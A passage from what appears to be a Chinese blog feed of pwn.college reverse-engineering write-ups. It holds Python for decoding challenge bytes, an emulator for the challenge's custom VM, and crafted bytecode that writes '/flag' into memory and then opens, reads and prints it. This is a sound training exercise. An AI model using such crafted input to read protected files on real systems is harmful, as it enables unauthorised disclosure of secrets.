punctuation">.</span>seek<span class="token punctuation">(</span>start_position<span class="token punctuation">)</span>  <span class="token comment"># 定位到指定的开始位置</span>            chunk <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>chunk_size<span class="token punctuation">)</span>  <span class="token comment"># 每次读取三个字节</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> chunk<span class="token punctuation">:</span>                <span class="token keyword">break</span>  <span class="token comment"># 到达文件末尾，退出循环</span>            <span class="token keyword">return</span> chunk  <span class="token comment"># 使用生成器返回读取的字节块</span>filepath <span class="token operator">=</span> <span class="token string">r"F:\研二上\coding\ctf\pwncollege\command"</span>res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">21</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      byte <span class="token operator">=</span> read_binary_file_in_chunks<span class="token punctuation">(</span>file_path<span class="token operator">=</span>filepath<span class="token punctuation">,</span> start_position<span class="token operator">=</span><span class="token number">0x386</span><span class="token operator">+</span>num<span class="token punctuation">,</span> chunk_size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">21</span> <span class="token punctuation">:</span>         <span class="token keyword">break</span>    res<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span> <span class="token operator">-</span> adder<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>      <span class="token keyword">if</span> res<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">:</span>         res<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">0xff</span>      res<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span>      num <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240606171440.png" alt="20240606171440"></p><h2 id="21-2"><a href="#21-2" class="headerlink" title="21.2"></a>21.2</h2><p>第二关跟上面的一样，</p><p>指令的组成形式由<code>arg_0 op arg_1</code>变成了<code>op arg_0 arg_1</code>，所以二进制指令的需要重新调整一下，另外模拟函数调用的字节特征也发生了变化，也需要进行相应的调整。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">def write_binary_file(file_path, data_list):    # 以二进制写模式打开文件    with open(file_path, &#39;wb&#39;) as f:        for data in data_list:            # 将二进制数据写入文件            f.write(data)# 示例数据：将几个二进制块写入文件data_list &#x3D; [    b&#39;\x08\x10\x08&#39;,# imm a &#x3D; 0x10    b&#39;\x08\x2f\x02&#39;,# imm b &#x3D; 0x2f    b&#39;\x10\x02\x08&#39;,# stm *a &#x3D; b    b&#39;\x08\x11\x08&#39;,# imm a &#x3D; 0x11    b&#39;\x08\x66\x02&#39;,# imm b &#x3D; 0x66    b&#39;\x10\x02\x08&#39;,# stm *a &#x3D; b    b&#39;\x08\x12\x08&#39;,# imm a &#x3D; 0x12    b&#39;\x08\x6c\x02&#39;,# imm b &#x3D; 0x6c    b&#39;\x10\x02\x08&#39;,# stm *a &#x3D; b            b&#39;\x08\x13\x08&#39;,# imm a &#x3D; 0x13    b&#39;\x08\x61\x02&#39;,# imm b &#x3D; 0x61    b&#39;\x10\x02\x08&#39;,# stm *a &#x3D; b        b&#39;\x08\x14\x08&#39;,# imm a &#x3D; 0x14    b&#39;\x08\x67\x02&#39;,# imm b &#x3D; 0x67    b&#39;\x10\x02\x08&#39;,# stm *a &#x3D; b        b&#39;\x08\x15\x08&#39;,# imm a &#x3D; 0x15    b&#39;\x08\x00\x02&#39;,# imm b &#x3D; 0x00    b&#39;\x10\x02\x08&#39;,# stm *a &#x3D; b      b&#39;\x08\x10\x08&#39;, # imm b &#x3D; 0x00    b&#39;\x08\x10\x02&#39;, # imm a &#x3D; 0x10            b&#39;\x40\x08\x20&#39;, # open       b&#39;\x08\x60\x10&#39;, # imm c &#x3D; 0x60      b&#39;\x08\x20\x02&#39;, # imm b &#x3D; 0x20      b&#39;\x40\x08\x01&#39;, # read(a, b, c)        b&#39;\x08\x60\x10&#39;, # imm c &#x3D; 0x60       b&#39;\x08\x01\x08&#39;, # imm a &#x3D; 0x01     b&#39;\x40\x08\x08&#39;, # write        b&#39;\x40\x01\x10&#39;, #exit]# 目标文件路径file_path &#x3D; r&#39;&#x2F;home&#x2F;hacker&#x2F;Test&#x2F;output2&#39;# 调用函数写入二进制数据write_binary_file(file_path, data_list)# 验证写入的数据with open(file_path, &#39;rb&#39;) as f:    content &#x3D; f.read()    print(content)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240609214816.png" alt="20240609214816"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-Writeup</title>
      <link href="/2024/06/06/pwn-college-writeup/"/>
      <url>/2024/06/06/pwn-college-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p>已经很久没有动笔写过东西了，马上要找工作了，把之前的东西捡一捡。</p><p><a href="https://pwn.college/program-security/reverse-engineering">https://pwn.college/program-security/reverse-engineering</a></p><h2 id="20-1"><a href="#20-1" class="headerlink" title="20.1"></a>20.1</h2><p>从这关开始，难度就大了一些，因为模拟的程序架构没有提示回显了。需要自行分析。这也是我第一次完整的把这个自定义架构理解明白，并且通过python复现了这个架构，复现的过程中，对于程序指令又有了一些新的体会，简单的IMM、ADD、STM、STK在加上一些系统调用居然可以自己定义。把自己的代码通过二进制的方式放在程序中，然后在运行的过程中，使用自己的定义的架构指令进行解析运行。</p><p>下面是解析文件中存放二进制程序指令内容的程序，期间将各个寄存器、栈指针、以及相应的提示进行显示。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">read_binary_file_in_chunks</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> start_position <span class="token punctuation">,</span>chunk_size<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment"># 以二进制模式打开文件</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>start_position<span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># 定位到指定的开始位置</span>            chunk <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>chunk_size<span class="token punctuation">)</span>  <span class="token comment"># 每次读取三个字节</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> chunk<span class="token punctuation">:</span>                <span class="token keyword">break</span>  <span class="token comment"># 到达文件末尾，退出循环</span>            <span class="token keyword">return</span> chunk  <span class="token comment"># 使用生成器返回读取的字节块</span><span class="token keyword">def</span> <span class="token function">get_memory</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> stack<span class="token punctuation">[</span>arg<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">get_char_register</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token string">"a"</span>    <span class="token keyword">elif</span> arg <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"b"</span>    <span class="token keyword">elif</span> arg <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> arg <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"d"</span>    <span class="token keyword">elif</span> arg <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"s"</span>    <span class="token keyword">elif</span> arg <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"i"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"unknow register"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">read_register</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> a<span class="token punctuation">,</span> b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> i <span class="token punctuation">,</span>f<span class="token punctuation">,</span>stack    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> a    <span class="token keyword">elif</span> arg <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> b    <span class="token keyword">elif</span> arg <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> c    <span class="token keyword">elif</span> arg <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> d    <span class="token keyword">elif</span> arg <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s    <span class="token keyword">elif</span> arg <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> i    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"unknow register"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">writer_register</span><span class="token punctuation">(</span>arg0<span class="token punctuation">,</span> arg1<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> a<span class="token punctuation">,</span> b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> i <span class="token punctuation">,</span>f<span class="token punctuation">,</span>stack    <span class="token keyword">if</span> arg0 <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> arg1 <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">elif</span> arg0 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        b <span class="token operator">=</span> arg1 <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">elif</span> arg0 <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">:</span>        c <span class="token operator">=</span> arg1 <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">elif</span> arg0 <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> arg1 <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">elif</span> arg0 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> arg1 <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">elif</span> arg0 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> arg1 <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">elif</span> arg0 <span class="token operator">==</span> <span class="token number">64</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> arg1 <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"unknown register"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write_to_memeory</span><span class="token punctuation">(</span>arg0<span class="token punctuation">,</span> arg1<span class="token punctuation">)</span><span class="token punctuation">:</span>    stack<span class="token punctuation">[</span>arg0<span class="token punctuation">]</span> <span class="token operator">=</span> arg1    <span class="token keyword">def</span> <span class="token function">print_register</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> a<span class="token punctuation">,</span> b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> i <span class="token punctuation">,</span>f<span class="token punctuation">,</span>stack    arg1<span class="token punctuation">,</span> op<span class="token punctuation">,</span> arg2 <span class="token operator">=</span> chunk    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"a:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string"> , b:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">, c:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">, d:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>d<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">, s:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">, i:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">, f:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>f<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"op:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>op<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string"> , arg1:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>arg1<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">, arg2:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>arg2<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">imm</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> a<span class="token punctuation">,</span> b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> i <span class="token punctuation">,</span>f<span class="token punctuation">,</span>stack    arg1<span class="token punctuation">,</span> op<span class="token punctuation">,</span> arg2 <span class="token operator">=</span> chunk    writer_register<span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f" IMM </span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_char_register<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>arg2<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    print_register<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> a<span class="token punctuation">,</span> b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> i <span class="token punctuation">,</span>f<span class="token punctuation">,</span>stack    arg1<span class="token punctuation">,</span> op<span class="token punctuation">,</span> arg2 <span class="token operator">=</span> chunk    v2 <span class="token operator">=</span> read_register<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>    v3 <span class="token operator">=</span> read_register<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>    writer_register<span class="token punctuation">(</span>arg1<span class="token punctuation">,</span>v2<span class="token operator">+</span>v3<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"ADD </span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_char_register<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_char_register<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    print_register<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stk</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> a<span class="token punctuation">,</span> b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> i <span class="token punctuation">,</span>f<span class="token punctuation">,</span>stack    arg1<span class="token punctuation">,</span> op<span class="token punctuation">,</span> arg2 <span class="token operator">=</span> chunk    <span class="token keyword">global</span> s    <span class="token keyword">if</span> arg2<span class="token punctuation">:</span> <span class="token comment"># push</span>        s <span class="token operator">+=</span> <span class="token number">1</span>        v2 <span class="token operator">=</span> read_register<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>        stack<span class="token punctuation">[</span>s<span class="token punctuation">]</span> <span class="token operator">=</span> v2        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"PUSH </span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_char_register<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> arg1<span class="token punctuation">:</span> <span class="token comment"># pop</span>        v4 <span class="token operator">=</span> stack<span class="token punctuation">[</span>s<span class="token punctuation">]</span>        writer_register<span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> v4<span class="token punctuation">)</span>        s <span class="token operator">-=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"POP </span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_char_register<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    print_register<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stm</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> a<span class="token punctuation">,</span> b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> i <span class="token punctuation">,</span>f<span class="token punctuation">,</span>stack    arg1<span class="token punctuation">,</span> op<span class="token punctuation">,</span> arg2 <span class="token operator">=</span> chunk    v2 <span class="token operator">=</span> read_register<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>    v3 <span class="token operator">=</span> read_register<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>    write_to_memeory<span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"STM *</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_char_register<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_char_register<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    print_register<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ldm</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> a<span class="token punctuation">,</span> b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> i <span class="token punctuation">,</span>f<span class="token punctuation">,</span>stack    arg1<span class="token punctuation">,</span> op<span class="token punctuation">,</span> arg2 <span class="token operator">=</span> chunk    v2 <span class="token operator">=</span> read_register<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>    v3 <span class="token operator">=</span> get_memory<span class="token punctuation">(</span>v2<span class="token punctuation">)</span>    writer_register<span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> v3<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"LDM </span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_char_register<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> = *</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_char_register<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    print_register<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cmp</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> a<span class="token punctuation">,</span> b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> i <span class="token punctuation">,</span>f<span class="token punctuation">,</span>stack    arg1<span class="token punctuation">,</span> op<span class="token punctuation">,</span> arg2 <span class="token operator">=</span> chunk    v3 <span class="token operator">=</span> read_register<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>    v4 <span class="token operator">=</span> read_register<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> v3 <span class="token operator">&lt;</span> v4<span class="token punctuation">:</span>        f <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> v3 <span class="token operator">></span> v4<span class="token punctuation">:</span>        f <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">0x10</span>    <span class="token keyword">if</span> v3 <span class="token operator">==</span> v4<span class="token punctuation">:</span>        f <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">if</span> v3 <span class="token operator">!=</span> v4<span class="token punctuation">:</span>        f <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">4</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> v3 <span class="token keyword">and</span> <span class="token keyword">not</span> v4<span class="token punctuation">:</span>        f <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">8</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"CMP </span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_char_register<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_char_register<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    print_register<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">jmp</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> a<span class="token punctuation">,</span> b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> i <span class="token punctuation">,</span>f<span class="token punctuation">,</span>stack    arg1<span class="token punctuation">,</span> op<span class="token punctuation">,</span> arg2 <span class="token operator">=</span> chunk    <span class="token keyword">if</span> <span class="token keyword">not</span> arg1 <span class="token keyword">or</span> <span class="token punctuation">(</span>arg1 <span class="token operator">&amp;</span> f <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> read_register<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"JMP TAKE JUMP TO </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        print_register<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"JMP Not TAKE"</span></span><span class="token punctuation">)</span>      print_register<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sys</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> a<span class="token punctuation">,</span> b <span class="token punctuation">,</span>c <span class="token punctuation">,</span>d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> i <span class="token punctuation">,</span>f<span class="token punctuation">,</span>stack    arg1<span class="token punctuation">,</span> op<span class="token punctuation">,</span> arg2 <span class="token operator">=</span> chunk    <span class="token keyword">if</span> <span class="token punctuation">(</span>arg1 <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">:</span>        <span class="token builtin">file</span> <span class="token operator">=</span> stack<span class="token punctuation">[</span>a<span class="token punctuation">]</span>        writer_register<span class="token punctuation">(</span>arg2<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OPEN File"</span><span class="token punctuation">)</span>        print_register<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arg1 <span class="token operator">&amp;</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        v3 <span class="token operator">=</span> c        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span> <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&lt;</span> v3<span class="token punctuation">:</span>            v3 <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">256</span> <span class="token operator">-</span> b <span class="token punctuation">)</span>        v4 <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>        writer_register<span class="token punctuation">(</span>arg2<span class="token punctuation">,</span> v4<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Read 3"</span><span class="token punctuation">)</span>        print_register<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>arg1 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        v5 <span class="token operator">=</span> c        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">256</span> <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">&lt;</span> v5<span class="token punctuation">:</span>            v5 